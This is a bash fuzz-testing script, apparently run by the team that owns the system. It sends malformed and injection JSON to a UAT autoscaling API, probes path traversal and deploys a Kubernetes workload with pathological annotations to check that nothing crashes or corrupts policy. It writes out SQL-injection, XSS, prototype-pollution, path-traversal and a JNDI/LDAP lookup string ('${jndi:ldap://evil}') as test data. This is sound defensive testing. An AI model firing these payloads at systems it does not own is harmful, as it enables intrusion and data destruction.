#!/usr/bin/env bash
# PHASE 11 — fuzz / adversarial specs. Two surfaces, both via the REAL API (never bypass):
#   (A) Backend policy PUT routes for xamops-test-1 fed malformed/boundary/injection JSON ->
#       must reject safely (4xx, not 5xx/crash), must NOT corrupt the live policy, agent stays live.
#   (B) Adversarial Kubernetes workloads the agent reads (absurd resource requests, pathological
#       annotations) -> agent collect/fit must tolerate them without crashlooping or mis-acting.
# Trap removes the adversarial workloads, deletes temp cookie, re-reads policy to prove intact.
set -uo pipefail
source /Users/apple/Desktop/XamOps-New/.agents/tasks/destroy-it-campaign-2026-10-26/_lib.sh

BASE=https://uat.xamops.com
CL=xamops-test-1
SRC=/Users/apple/.config/xamops/uat-session
TMP=$(mktemp /tmp/uat-sess.XXXXXX); chmod 600 "$TMP"
SESSION_VAL=$(grep -oE 'SESSION=[A-Za-z0-9+/=_-]+' "$SRC" | head -1 | cut -d= -f2-)
[ -z "$SESSION_VAL" ] && SESSION_VAL=$(sed -E 's/.*SESSION=([A-Za-z0-9+/=_-]+).*/\1/' "$SRC" | head -1)
printf 'SESSION=%s' "$SESSION_VAL" > "$TMP"
COOKIE="Cookie: $(cat "$TMP")"

cleanup() {
  echo "=== [phase11 trap] cleanup ==="
  k -n stress delete deploy adversarial-fuzz --ignore-not-found >/dev/null 2>&1
  k -n stress delete pod fuzz-annot-bomb --ignore-not-found >/dev/null 2>&1
  rm -f "$TMP" /tmp/p11-*.json 2>/dev/null
  pkill -f "port-forward.*19090:9090" 2>/dev/null
  echo "=== [phase11 trap] done ==="
}
trap cleanup EXIT INT TERM
assert_ctx || { echo "ABORT phase11"; exit 1; }

# capture the CURRENT live policy (consolidation) to prove fuzz does NOT corrupt it
echo "=== BEFORE: live consolidation policy snapshot ==="
curl -s -o /tmp/p11-before.json -w "GET consolidation HTTP %{http_code}\n" -H "$COOKIE" \
  "$BASE/api/eks/autoscaling/$CL/consolidation" 2>&1
head -c 400 /tmp/p11-before.json 2>/dev/null; echo

put_fuzz() {
  # $1 = route suffix, $2 = description, $3 = raw body
  local route="$1" desc="$2" body="$3"
  local code
  code=$(curl -s -o /tmp/p11-resp.json -w '%{http_code}' -X PUT -H "$COOKIE" \
    -H "Content-Type: application/json" --data "$body" \
    "$BASE/api/eks/autoscaling/$CL/$route" 2>/dev/null)
  local snip; snip=$(head -c 160 /tmp/p11-resp.json 2>/dev/null | tr '\n' ' ')
  echo "  [$code] $desc -> ${snip}"
  # 5xx = server-side crash on bad input = a BUG; record it
  if [ "${code:0:1}" = "5" ]; then echo "  *** 5xx ON FUZZ INPUT ($route / $desc) — candidate BUG ***"; fi
}

echo "=== (A) FUZZ backend policy PUTs (malformed / boundary / injection) ==="
echo "-- consolidation route --"
put_fuzz consolidation "empty body"                 ''
put_fuzz consolidation "not json (garbage)"         'not-json-@@@'
put_fuzz consolidation "wrong type enabled=string"  '{"enabled":"yes-please"}'
put_fuzz consolidation "enabled=null"               '{"enabled":null}'
put_fuzz consolidation "deeply nested junk"         '{"enabled":true,"x":{"y":{"z":{"a":[1,2,3]}}}}'
put_fuzz consolidation "huge number"                '{"enabled":true,"maxParallel":99999999999999999999}'
put_fuzz consolidation "negative"                   '{"enabled":true,"maxParallel":-5}'
put_fuzz consolidation "unicode/sql-ish injection"  '{"enabled":true,"note":"'"'"'; DROP TABLE clusters;--"}'
put_fuzz consolidation "xss-ish"                    '{"enabled":true,"note":"<script>alert(1)</script>"}'
put_fuzz consolidation "array where object"         '[1,2,3]'
echo "-- evictor-policy route --"
put_fuzz evictor-policy "analyseOnly wrong type"    '{"analyseOnly":"false"}'
put_fuzz evictor-policy "unknown extra field"       '{"analyseOnly":false,"__proto__":{"admin":true}}'
echo "-- mode route --"
put_fuzz mode "invalid enum"                        '{"mode":"ULTRA-DESTROY"}'
put_fuzz mode "mode=number"                         '{"mode":123}'
echo "-- node-optimizer route --"
put_fuzz node-optimizer "all flags as strings"      '{"autoCordon":"maybe","autoDrain":"sure"}'
echo "-- path fuzz (wrong cluster name / traversal) --"
code=$(curl -s -o /dev/null -w '%{http_code}' -X PUT -H "$COOKIE" -H "Content-Type: application/json" \
  --data '{"enabled":true}' "$BASE/api/eks/autoscaling/..%2f..%2fadmin/consolidation" 2>/dev/null)
echo "  [$code] path-traversal clusterName"
code=$(curl -s -o /dev/null -w '%{http_code}' -X PUT -H "$COOKIE" -H "Content-Type: application/json" \
  --data '{"enabled":true}' "$BASE/api/eks/autoscaling/xamops-test-DOES-NOT-EXIST/consolidation" 2>/dev/null)
echo "  [$code] nonexistent clusterName"

echo "=== VERIFY live policy NOT corrupted by the fuzz ==="
curl -s -o /tmp/p11-after.json -w "GET consolidation HTTP %{http_code}\n" -H "$COOKIE" \
  "$BASE/api/eks/autoscaling/$CL/consolidation" 2>&1
if diff <(python3 -c 'import json,sys;print(json.dumps(json.load(open("/tmp/p11-before.json")),sort_keys=True))' 2>/dev/null) \
        <(python3 -c 'import json,sys;print(json.dumps(json.load(open("/tmp/p11-after.json")),sort_keys=True))' 2>/dev/null) >/dev/null 2>&1; then
  echo "  POLICY UNCHANGED (fuzz did not corrupt the live consolidation policy) ✅"
else
  echo "  *** POLICY CHANGED after fuzz — investigate ***"
  echo "  before:"; head -c 300 /tmp/p11-before.json; echo
  echo "  after :"; head -c 300 /tmp/p11-after.json; echo
fi

echo "=== (B) adversarial Kubernetes workloads the agent reads ==="
# absurd resource requests + pathological labels/annotations in ns stress (agent collect must tolerate)
cat <<'YAML' | k apply -f - >/dev/null 2>&1
apiVersion: apps/v1
kind: Deployment
metadata:
  name: adversarial-fuzz
  namespace: stress
  labels: {app: fleet-http, xamops.io/phase: "11", deployment: adversarial-fuzz}
  annotations:
    xamops.io/fuzz: "'; DROP TABLE nodes;-- <script>x</script> \u0000 ${jndi:ldap://evil}"
spec:
  replicas: 1
  selector: {matchLabels: {deployment: adversarial-fuzz}}
  template:
    metadata:
      labels: {app: fleet-http, deployment: adversarial-fuzz}
      annotations: {cluster-autoscaler.kubernetes.io/safe-to-evict: "not-a-bool"}
    spec:
      terminationGracePeriodSeconds: 999999
      containers:
        - name: whoami
          image: docker.io/traefik/whoami:latest
          resources:
            requests: {cpu: "1m", memory: "1Ki"}
            limits: {cpu: "16", memory: "64Gi"}
YAML
echo "adversarial-fuzz deploy applied (absurd limits 16cpu/64Gi, grace 999999s, injection annotations)"
sleep 8
k -n stress get deploy adversarial-fuzz -o wide 2>/dev/null | tail -1
k -n stress get pods -l deployment=adversarial-fuzz -o wide 2>/dev/null | tail -2

echo "=== agent survived the adversarial specs? ==="
sleep 20
k -n xamops-system get pods -l app=xamops-automation --no-headers 2>/dev/null
LEADER=$(k -n xamops-system get pods -l app=xamops-automation -o name 2>/dev/null | head -1)
echo "-- leader log: panics / collect errors in last 3m --"
k -n xamops-system logs "$LEADER" --since=3m 2>/dev/null | grep -iE 'panic|fatal|collect:.*error|invalid|cannot parse|nil pointer' | tail -8 || echo "  (none)"
pkill -f "port-forward.*19090:9090" 2>/dev/null; sleep 1
k -n xamops-system port-forward "$LEADER" 19090:9090 >/tmp/pf-agent.log 2>&1 & sleep 4
echo "-- gate still live + evicted still 0 --"
curl -s http://localhost:19090/metrics 2>/dev/null | grep -E 'xamops_gate_decision\{controller="(consolidation-actions|evictor|rebalancer)".*live|^xamops_consolidation_pods_evicted_total'
pkill -f "port-forward.*19090:9090" 2>/dev/null
echo "PHASE11-DONE"
